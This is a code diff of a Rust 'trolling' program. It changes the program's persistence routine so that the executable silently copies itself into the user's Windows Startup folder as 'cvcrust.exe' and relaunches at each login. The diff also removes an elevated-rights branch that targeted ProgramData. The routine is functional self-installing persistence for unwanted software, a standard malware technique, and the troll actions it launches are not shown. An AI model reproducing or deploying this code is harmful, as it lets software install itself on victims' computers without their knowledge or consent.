@@ -2,20 +2,19 @@
 
 extern crate alloc;
 
-mod windows;
 mod trollages;
 
 use std::sync::mpsc::channel;
 use std::time::Duration;
 use std::fs::File;
+use std::process;
 use std::io::copy;
 use std::thread;
 use rand::Rng;
 use std::env;
 
 fn main() {
-    //TODO: Use elevated perms if elevated, currently it just starts itself as admin in C:\Programs
-    persistence(windows::is_app_elevated());
+    persistence();
     trolling_loop()
 }
 
@@ -57,22 +56,19 @@ fn rand_troll() {
     }
 }
 
-fn persistence(elevated: bool) {
+fn persistence() {
     let current_buf = env::current_exe().unwrap();
-    let exe_basename = current_buf.parent().unwrap().to_str().unwrap();
+    let exe_parent = current_buf.parent().unwrap().to_str().unwrap();
     let exe_name = current_buf.file_name().unwrap().to_str().unwrap();
-    let mut startup_user = env::var("APPDATA").unwrap();
-    if elevated {
-        startup_user = "C:\\ProgramData".to_string();
-    }
 
-    let execution_path = exe_basename.to_owned() + "\\" + exe_name;
-    let startup_path = startup_user + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exe_name;
+    let execution_path = format!("{}\\{}", exe_parent, exe_name);
+    let new_path = format!("{}\\{}\\{}", env::var("APPDATA").unwrap(), "Microsoft\\Windows\\Start Menu\\Programs\\Startup" , "cvcrust.exe");
 
-    let mut src = File::open(&execution_path).unwrap();
-    let mut dest = File::create(&startup_path).unwrap();
-
-    if execution_path != startup_path {
+    if execution_path != new_path {
+        let mut src = File::open(&execution_path).unwrap();
+        let mut dest = File::create(&new_path).unwrap();
         let _ = copy(&mut src,&mut dest).unwrap();
+        process::exit(0);
     }
+
 }
